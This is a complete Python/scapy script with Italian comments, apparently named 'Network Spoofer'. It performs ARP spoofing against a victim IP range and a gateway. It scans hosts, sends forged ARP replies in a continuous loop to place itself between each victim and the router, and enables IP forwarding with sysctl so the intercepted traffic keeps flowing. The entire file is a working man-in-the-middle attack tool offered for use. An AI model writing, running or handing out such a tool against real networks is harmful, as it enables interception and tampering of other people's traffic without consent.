#!/usr/bin/env python
import sys
import scapy.all as scapy
import argparse
import time
import subprocess

subprocess.call(["clear"])
print("\n\n")
print(" _______          __                       __       _________              _____")
print(" \      \   _____/  |___  _  _____________|  | __  /   _____/_____   _____/ ____\___________")
print(" /   |   \_/ __ \   __\ \/ \/ /  _ \_  __ \  |/ /  \_____  \\\____ \ /  _ \   __\/ __ \_  __ \\")
print("/    |    \  ___/|  |  \     (  <_> )  | \/    <   /        \  |_> >  <_> )  | \  ___/|  | \/")
print("\____|__  /\___  >__|   \/\_/ \____/|__|  |__|_ \ /_______  /   __/ \____/|__|  \___  >__|   ")
print("        \/     \/                              \/         \/|__|                    \/       ")
print("\n\n")

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="IP o intervallo di IP da analizzare nella rete")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="IP del gateway")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("\n[-] Attenzione, specifica l'IP della vittima.")
    elif not options.gateway_ip:
        parser.error("\n[-] Attenzione, specifica l'IP del gateway.")
    return options

def get_mac(ip):
    answered_list = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=1, verbose=False)[0]
    try:
        return answered_list[0][1].hwsrc
    except IndexError:
        pass

def scan(ip):
    lista_risposte = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=1, verbose=False)[0]
    lista_client = []
    for client in lista_risposte:
        client_dict = {"ip":client[1].psrc, "mac":client[1].hwsrc}
        lista_client.append(client_dict)
    return lista_client

def stampa_risultato(lista_risultati, packet):
    subprocess.call(["clear"])
    print("\n\n")
    print(" _______          __                       __       _________              _____")
    print(" \      \   _____/  |___  _  _____________|  | __  /   _____/_____   _____/ ____\___________")
    print(" /   |   \_/ __ \   __\ \/ \/ /  _ \_  __ \  |/ /  \_____  \\\____ \ /  _ \   __\/ __ \_  __ \\")
    print("/    |    \  ___/|  |  \     (  <_> )  | \/    <   /        \  |_> >  <_> )  | \  ___/|  | \/")
    print("\____|__  /\___  >__|   \/\_/ \____/|__|  |__|_ \ /_______  /   __/ \____/|__|  \___  >__|   ")
    print("        \/     \/                              \/         \/|__|                    \/       ")
    print("\n\n")
    print("IP\t\t\t\tMACAddress\n----------------------------------------------------")
    for client in lista_risultati:
        print(client["ip"] + "\t\t\t" + client["mac"])

    print("\n\n[+] Packet send: " + str(packet) + "\n\n")

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    scapy.send(scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip, hwsrc=get_mac(source_ip)), count=4, verbose=False)
    print("[+] Ripristino completato con successo di " + str(destination_ip) + "!")

options = get_arguments()
print("[+] Configuro l'inoltro dei pacchetti verso il router!")
subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.PIPE)
lista_target_da_ripristinare = []
gateway_ip = options.gateway_ip

try:
    sent_packet_count = 0
    while True:
        lista_scan = scan(options.target_ip)
        stampa_risultato(lista_scan, sent_packet_count)
        for target in lista_scan:
            if target["ip"] not in lista_target_da_ripristinare:
                lista_target_da_ripristinare.append(target["ip"])
            spoof(target["ip"], gateway_ip)  # Mi fingo il gateway mandando risposte alla vittima.
            spoof(gateway_ip, target["ip"])  # Mi fingo la vittima mandando risposte alla gateway.
            sent_packet_count += 1
        time.sleep(1)

except KeyboardInterrupt:
    print("[-] Rilevato CTRL+C ...... Chiusura.")
    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=0"], stdout=subprocess.PIPE)
    print("[-] Disattivato l'inoltro dei pacchetti verso il router!")
    for client in lista_target_da_ripristinare:
        restore(client, gateway_ip)
    print("[-] Il PC non inoltrera' piu' i pacchetti verso il router!")
    print("\n\n\n")